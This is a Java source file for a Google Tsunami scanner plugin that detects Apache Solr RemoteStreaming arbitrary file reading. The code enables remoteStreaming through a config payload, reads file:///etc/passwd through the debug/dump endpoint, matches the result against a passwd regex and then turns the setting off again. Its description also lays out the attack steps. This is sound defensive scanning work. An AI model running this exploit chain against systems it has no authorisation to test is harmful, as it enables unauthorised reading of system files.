/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.solr;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.auto.value.AutoValue;
import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonElement;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects unprotected Apache Solr RemoteStreaming Arbitrary File
 * Reading
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheSolrArbitraryFileReadingDetector",
    version = "0.1",
    description =
        "This detector checks for unprotected Apache Solr RemoteStreaming Arbitrary File "
            + "Reading vulnerability.",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = ApacheSolrArbitraryFileReadingDetectorBootstrapModule.class)
public final class ApacheSolrArbitraryFileReadingDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN =
      Pattern.compile(
          "(root:[x*]:0:0:)|(\\(Permission denied\\))|(\\(No such file or directory\\))");

  @VisibleForTesting
  static final String DESCRIPTION =
      "When Apache Solr service is exposed to untrusted networks and authentication is not enabled,"
          + " the exposed APIs allow attackers to enable Solr's `RemoteStreaming` service and use"
          + " this service to perform Server Side Request Forgery (SSRF) and/or Local File"
          + " Inclusion (LFI) attacks on the system. This is usually done using the following"
          + " steps:\n\n"
          + "  1. Enumerating available Solr database names by sending a request to"
          + " http://[solr_service]/solr/admin/cores?indexInfo=false&wt=json\n"
          + "  2. Enabling `RemoteStreaming` service for a given database by sending a request to"
          + " http://[solr_service]/solr/[database]/config with the following json payload"
          + " `{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}`\n"
          + "  3. Reading arbitrary file through `stream.url` parameter by sending a request to"
          + " http://[solr_service]/solr/[database]/debug/dump?param=ContentStreams&stream.url=file://[file_on_system_running_solr].\n\n"
          + "See extra details for the exact scanning traffic sent by the scanner and use them to"
          + " reproduce this vulnerability.";

  @VisibleForTesting
  static final String RECOMMENDATION =
      "Apache Solr is acknowledged by its developers to be insecure and should never be exposed on"
          + " the Internet per https://cwiki.apache.org/confluence/display/SOLR/SolrSecurity and"
          + " https://solr.apache.org/guide/8_11/securing-solr.html. It is highly recommended that"
          + " the Apache Solr service is bound to localhost whenever possible and you **DO NOT**"
          + " use Apache Solr for handling Confidential or Need-to-Know data.";

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  ApacheSolrArbitraryFileReadingDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .map(this::checkService)
                .filter(CheckResult::isVulnerable)
                .map(checkResult -> buildDetectionReport(targetInfo, checkResult))
                .collect(toImmutableList()))
        .build();
  }

  private CheckResult checkService(NetworkService networkService) {
    for (String core : getCores(networkService)) {
      var checkTracesBuilder = CheckTraces.builder();

      var vulnerable = false;
      if (enableRemoteStreaming(networkService, core, checkTracesBuilder)) {
        try {
          if (performExploit(networkService, core, checkTracesBuilder)) {
            vulnerable = true;
          }
        } finally {
          closeRemoteStreaming(networkService, core, checkTracesBuilder);
        }
      }

      if (vulnerable) {
        return CheckResult.newForVulnerableService(networkService, checkTracesBuilder.build());
      }
    }
    return CheckResult.newForSafeService(networkService);
  }

  private ImmutableList<String> getCores(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "solr/admin/cores?wt=json&indexInfo=false&_="
            + utcClock.millis();
    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      try {
        if (!response.bodyJson().isPresent()) {
          return ImmutableList.of();
        }
        JsonElement json = response.bodyJson().get();
        return ImmutableList.copyOf(
            json.getAsJsonObject().get("status").getAsJsonObject().keySet());
      } catch (Throwable t) {
        logger.atInfo().log("Failed to parse cores response json");
        return ImmutableList.of();
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return ImmutableList.of();
    }
  }

  private boolean enableRemoteStreaming(
      NetworkService networkService, String core, CheckTraces.Builder checkTracesBuilder) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "solr/" + core + "/config";
    String payload =
        "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}";
    try {
      var request =
          post(targetUri)
              .withEmptyHeaders()
              .setRequestBody(ByteString.copyFrom(payload, "UTF8"))
              .build();
      var response = httpClient.send(request);
      checkTracesBuilder.add(request, response);
      return response.status().code() == 200;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to POST '%s'.", targetUri);
      return false;
    }
  }

  private void closeRemoteStreaming(
      NetworkService networkService, String core, CheckTraces.Builder checkTracesBuilder) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "solr/" + core + "/config";
    String payload =
        "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":false}}";
    try {
      var request =
          post(targetUri)
              .withEmptyHeaders()
              .setRequestBody(ByteString.copyFrom(payload, "UTF8"))
              .build();
      var response = httpClient.send(request, networkService);
      checkTracesBuilder.add(request, response);
      if (response.status().code() != 200) {
        logger.atWarning().log("Unable to close remote streaming");
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to POST '%s'.", targetUri);
    }
  }

  private boolean performExploit(
      NetworkService networkService, String core, CheckTraces.Builder checkResultBuilder) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "solr/"
            + core
            + "/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd";
    try {
      var request = get(targetUri).withEmptyHeaders().build();
      var response = httpClient.send(request, networkService);
      checkResultBuilder.add(request, response);
      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
        if (VULNERABILITY_RESPONSE_PATTERN.matcher(response.bodyString().get()).find()) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(TargetInfo targetInfo, CheckResult checkResult) {
    var detectionReportBuilder =
        DetectionReport.newBuilder()
            .setTargetInfo(targetInfo)
            .setNetworkService(checkResult.networkService())
            .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
            .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
            .setVulnerability(
                Vulnerability.newBuilder()
                    .setMainId(
                        VulnerabilityId.newBuilder()
                            .setPublisher("TSUNAMI_COMMUNITY")
                            .setValue("APACHE_SOLR_REMOTE_STREAMING_FILE_READING"))
                    .setSeverity(Severity.HIGH)
                    .setTitle("Apache Solr RemoteStreaming Arbitrary File Reading")
                    .setDescription(DESCRIPTION)
                    .setRecommendation(RECOMMENDATION));
    checkResult
        .checkTraces()
        .ifPresent(
            checkTraces ->
                detectionReportBuilder
                    .getVulnerabilityBuilder()
                    .addAdditionalDetails(
                        AdditionalDetail.newBuilder()
                            .setTextData(TextData.newBuilder().setText(checkTraces.dump()))));
    return detectionReportBuilder.build();
  }

  @AutoValue
  abstract static class CheckResult {
    abstract boolean isVulnerable();

    abstract NetworkService networkService();

    abstract Optional<CheckTraces> checkTraces();

    static CheckResult newForSafeService(NetworkService networkService) {
      return new AutoValue_ApacheSolrArbitraryFileReadingDetector_CheckResult(
          false, networkService, Optional.empty());
    }

    static CheckResult newForVulnerableService(
        NetworkService networkService, CheckTraces checkTraces) {
      return new AutoValue_ApacheSolrArbitraryFileReadingDetector_CheckResult(
          true, networkService, Optional.of(checkTraces));
    }
  }
}
